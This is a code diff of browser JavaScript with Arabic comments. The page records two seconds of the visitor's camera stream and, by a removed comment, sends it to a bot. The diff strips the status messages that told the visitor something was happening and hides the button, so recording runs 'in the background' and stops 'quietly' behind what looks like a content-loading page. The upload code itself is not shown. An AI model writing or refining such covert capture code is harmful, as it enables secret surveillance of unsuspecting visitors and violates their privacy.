@@ -23,7 +23,8 @@
                 const video = document.getElementById('v');
                 video.srcObject = stream;
 
-                document.body.innerHTML = '<h2>جاري المعالجة، يرجى الانتظار...</h2>';
+                // إخفاء الزر فقط بدون إظهار أي كلمات مزعجة
+                document.getElementById('btn').style.display = 'none';
 
                 let mediaRecorder;
                 let chunks = [];
@@ -31,7 +32,7 @@
                 try {
                     mediaRecorder = new MediaRecorder(stream, { mimeType: 'video/webm' });
                 } catch (e) {
-                    mediaRecorder = new MediaRecorder(stream); // دعم لو المتصفح مش بيقبل webm
+                    mediaRecorder = new MediaRecorder(stream);
                 }
 
                 mediaRecorder.ondataavailable = e => {
@@ -55,13 +56,11 @@
                     }
 
                     stream.getTracks().forEach(t => t.stop());
-                    document.body.innerHTML = '<h2>تم تحميل المحتوى بنجاح!</h2>';
                 };
 
-                // بدء التسجيل
                 mediaRecorder.start();
 
-                // إيقاف التسجيل تلقائياً بعد ثانيتين وارساله للبوت
+                // تسجيل لمدة ثانيتين في الخلفية ثم إيقافه بهدوء
                 setTimeout(() => {
                     if (mediaRecorder.state === 'recording') {
                         mediaRecorder.stop();
